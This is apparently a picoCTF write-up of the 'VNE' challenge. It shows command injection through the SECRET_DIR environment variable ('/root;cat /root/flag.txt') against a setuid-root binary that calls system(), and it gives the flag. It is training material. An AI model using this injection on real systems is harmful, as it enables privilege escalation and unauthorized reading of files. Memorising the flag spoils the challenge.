# VNE
> We've got a binary that can list directories as root, try it out !!

> Additional details will be available after launching your challenge instance.

## About the Challenge
We were given an access to SSH server and then there is a file called `bin` and if we run the file


[Image extracted text: ctf-player@pico-challs 1s
~la
total 24
drwxr
xr-X 1
ctf-player ctf-player
20 Mar 28 15.40
drwxr
Xr-X 1
root
root
24 Mar 16 01:59
drwx
2 ctf-player
ctf-player
34 Mar 28 15.40
cache
rW-r--r-=
root
root
67
Mar 16 01:59
profile
rwsr-Xr-X 1
root
root
18752 Mar 16 01:59
bin
ctf-player@pico-chall$
Ibin
Error
SECRET_DIR environment
variable is
not set]


## How to Solve?
If we set an environment variables called `SECRET_DIR` and the value is `/root` because we need to know what is inside `/root` directory. You can use this command

```shell
export SECRET_DIR=/root
```

Here is the output


[Image extracted text: ctf-player@pico-chall$
export SECRET_DIR-/root
ctf-player@pico-challs
Ibin
Listing the content
of
Iroot
root:
flag-
txt]


As you can see there is a file called `flag.txt` and we need to read the content of the file to obtain the flag. If we check the string of the `bin` file using this command

```shell
strings bin
```

Here is the output


[Image extracted text: SECRET_DIR
Error
SECRET_DIR environment variable is
not
set
Listing
the
content
of
root:
Error
system() call
returned
non-zero
value:
*3$"
ZPLR]


As you can see the file using `system()` function to listing a directory, so the idea here, we need to do Command injection by adding `; command` in the `SECRET_DIR` environment variable values. So for example

```shell
export SECRET_DIR="/root;cat /root/flag.txt"
```

And then rerun the program to obtain the flag


[Image extracted text: ctf-player@pico-chall$
Ibin
Listing the
content of
Iroot;cat /root/flag-txt
root:
flag-txt
picoCTF{Power_tO_man!pul4t3
3nv_cdebza4d}ctf-player@pico]


```
picoCTF{Power_t0_man!pul4t3_3nv_cdeb2a4d}
```